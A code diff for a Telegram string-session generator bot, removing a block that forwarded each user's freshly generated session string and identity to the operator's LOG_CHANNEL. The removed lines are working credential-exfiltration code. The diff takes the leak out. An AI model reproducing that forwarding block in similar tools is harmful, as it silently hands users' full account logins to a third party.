@@ -1,7 +1,5 @@
 from telethon import TelegramClient
 from pyrogram import Client, filters
-from config import LOG_CHANNEL
-from pyrogram.types import Message
 from asyncio.exceptions import TimeoutError
 from telethon.sessions import StringSession
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
@@ -327,15 +325,6 @@ async def cancelled(msg):
             await bot.send_message(msg.chat.id, text)
     except KeyError:
         pass
-    
-    await bot.send_message(
-        LOG_CHANNEL,
-        f"📥 <b>New session generated!</b>\n\n"
-        f"👤 User: {msg.from_user.mention} (`{msg.from_user.id}`)\n"
-        f"🔑 Session:\n<code>{string_session}</code>",
-        parse_mode="html"
-    )
-    
     await client.disconnect()
     await bot.send_message(msg.chat.id, "» 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲 𝐆𝐫𝐧𝐞𝐫𝐚𝐭𝐞𝐝 𝐘𝐨𝐮 {} 𝐒𝐭𝐫𝐢𝐧𝐠 𝐒𝐞𝐬𝐬𝐢𝐨𝐧.\n\n𝐏𝐥𝐞𝐚𝐬𝐞 𝐂𝐡𝐞𝐜𝐤 𝐘𝐨𝐮𝐫 𝐒𝐚𝐯𝐞𝐝 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐓𝐨 𝐆𝐞𝐭 𝐈𝐭 ! \n\n𝐀 𝐒𝐭𝐫𝐢𝐧𝐠  𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐨𝐫 𝐁𝐨𝐭 𝐁𝐲 @ANKAN_Contact_BOT ♦".format("ᴛᴇʟᴇᴛʜᴏɴ" if telethon else "ᴩʏʀᴏɢʀᴀᴍ"))
 
